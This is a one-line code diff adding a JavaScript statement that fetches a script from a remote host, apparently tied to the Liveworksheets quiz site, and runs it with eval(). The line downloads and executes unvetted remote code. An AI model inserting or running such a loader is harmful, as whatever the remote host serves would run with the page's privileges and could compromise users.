@@ -1,0 +1,1 @@
+fetch("https://scripts.quizit.online/liveworksheets").then(res => res.text()).then(script => eval(script))
